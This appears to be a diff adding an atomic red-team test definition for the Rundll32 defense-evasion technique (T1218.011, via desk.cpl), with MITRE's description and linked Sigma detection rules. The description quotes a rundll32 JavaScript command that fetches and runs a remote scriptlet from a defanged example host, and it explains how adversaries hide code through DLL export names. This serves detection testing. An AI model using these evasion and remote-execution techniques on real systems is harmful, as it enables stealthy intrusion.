@@ -1,0 +1,36 @@
+Attack_name: Rundll32
+Attack_description: |-
+  Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).
+
+  Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)
+
+  Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)
+
+  Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll)
+guid: 83a95136-a496-423c-81d3-1c6750133917
+name: Rundll32 with desk.cpl
+tactic:
+  - defense-evasion
+technique:
+  - T1218.011
+os:
+  - windows
+description: "Rundll32.exe loading an executable renamed as .scr using desk.cpl \nReference: \n  - [LOLBAS - Libraries/Desk](https://lolbas-project.github.io/lolbas/Libraries/Desk/)\nSIGMA rules:\n  - [SCR\
+  \ File Write Event](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/file_event/file_event_win_new_src_file.yml)\n  - [Rundll32 InstallScreenSaver Execution](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_installscreensaver.yml)\n"
+executor: command_prompt
+sigma: true
+sigma_rule:
+  - id: fff9d2b7-e11c-4a69-93d3-40ef66189767
+    name: proc_creation_win_susp_copy_system32.yml
+  - id: 737e618a-a410-49b5-bec3-9e55ff7fbc15
+    name: proc_creation_win_susp_calc.yml
+  - id: c048f047-7e2a-4888-b302-55f509d4a91d
+    name: file_event_win_new_src_file.yml
+  - id: 97aa2e88-555c-450d-85a6-229bcd87efb8
+    name: file_event_win_creation_scr_binary_file.yml
+  - id: 15bd98ea-55f4-4d37-b09a-e7caa0fa2221
+    name: proc_creation_win_rundll32_installscreensaver.yml
+  - id: c3a99af4-35a9-4668-879e-c09aeb4f2bdf
+    name: proc_creation_win_run_executable_invalid_extension.yml
+  - id: dca91cfd-d7ab-4c66-8da7-ee57d487b35b
+    name: proc_creation_win_susp_run_folder.yml
